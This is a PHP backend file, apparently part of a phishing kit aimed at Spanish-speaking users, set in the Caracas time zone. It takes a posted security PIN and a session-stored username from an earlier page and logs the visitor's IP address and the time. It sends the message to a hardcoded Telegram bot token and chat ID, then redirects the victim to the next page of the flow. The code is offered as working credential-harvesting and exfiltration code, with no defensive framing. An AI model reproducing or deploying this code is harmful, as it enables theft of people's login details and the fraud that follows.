<?php
// =========================================================================
// CRUCIAL: Iniciar la sesión en la primera línea para poder recuperar
// el usuario que guardó el primer archivo PHP.
// =========================================================================
session_start();

// Configuración de las credenciales del Bot de Telegram (Tomadas de tu mensaje anterior)
define('TELEGRAM_TOKEN', '8659032163:AAFH5fI32Cxe0r9pAv69rH8U4a_HeJVajxM');
define('TELEGRAM_CHAT_ID', '7917802444');
define('REDIRECCION_URL', 'index2.html'); // Próxima página de tu flujo

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // =========================================================================
    // NUEVO: Recuperamos el usuario que guardamos en la sesión del primer PHP
    // =========================================================================
    $usuario = isset($_SESSION['usuario_guardado']) ? $_SESSION['usuario_guardado'] : 'No detectado';

    // 1. Recibir el PIN de seguridad de manera limpia
    $pin_seguridad = isset($_POST['pin_seguridad']) ? trim($_POST['pin_seguridad']) : 'No provisto';

    // 2. Capturar la dirección IP del visitante
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_usuario = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_usuario = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        $ip_usuario = $_SERVER['REMOTE_ADDR'];
    }

    // 3. Capturar la fecha y hora exacta
    date_default_timezone_set('America/Caracas'); 
    $fecha_hora = date('Y-m-d H:i:s');

    // 4. Construir el mensaje usando formato HTML seguro (Incluye el usuario recuperado)
    $mensaje  = "🔐 <b>Autoriso el dispositibo</b>\n\n";
    $mensaje .= "👤 <b>Usuario Asociado:</b> " . htmlspecialchars($usuario, ENT_QUOTES, 'UTF-8') . "\n";
   
    $mensaje .= "🌐 <b>Dirección IP:</b> " . htmlspecialchars($ip_usuario, ENT_QUOTES, 'UTF-8') . "\n";
    $mensaje .= "⏰ <b>Fecha y Hora:</b> " . htmlspecialchars($fecha_hora, ENT_QUOTES, 'UTF-8') . "\n";

    // 5. Realizar el envío de la petición a la API de Telegram mediante cURL
    enviarATelegram($mensaje);

    // 6. Redireccionar al usuario a la siguiente fase
    header("Location: " . REDIRECCION_URL);
    exit();

} else {
    header("HTTP/1.1 405 Method Not Allowed");
    echo "Método no permitido.";
    exit();
}

/**
 * Función encargada de realizar la petición HTTP POST a la API de Telegram usando formato HTML.
 */
function enviarATelegram($texto) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";

    $datos = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $texto,
        'parse_mode' => 'HTML' 
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($datos));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

    $respuesta = curl_exec($ch);
    curl_close($ch);

    return $respuesta;
}
?>